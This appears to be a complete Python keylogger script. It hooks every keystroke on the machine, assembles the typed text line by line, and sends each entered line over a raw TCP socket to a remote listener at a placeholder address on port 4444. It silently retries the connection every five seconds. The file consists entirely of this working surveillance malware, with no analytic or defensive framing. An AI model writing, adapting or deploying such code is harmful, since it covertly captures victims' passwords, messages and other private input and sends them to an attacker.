import socket,keyboard,time
sock,buffer="",""
def connect():
    global sock
    while 1:
        try:
            sock=socket.socket()
            sock.connect(("IP",4444))
            return
        except:time.sleep(5)
def on_key(e):
    global buffer,sock
    if e.event_type!=keyboard.KEY_DOWN:return
    k=e.name
    if len(k)>1:
        b=' 'if k=='space'else'\n'if k=='enter'else'\t'if k=='tab'else''
        if b:buffer+=b
        elif k=='backspace':buffer=buffer[:-1]
    else:buffer+=k
    if k=='enter' and buffer.strip():
        try:sock.send(buffer.encode())
        except:pass
        buffer=""
keyboard.hook(on_key)
connect()
while 1:time.sleep(1)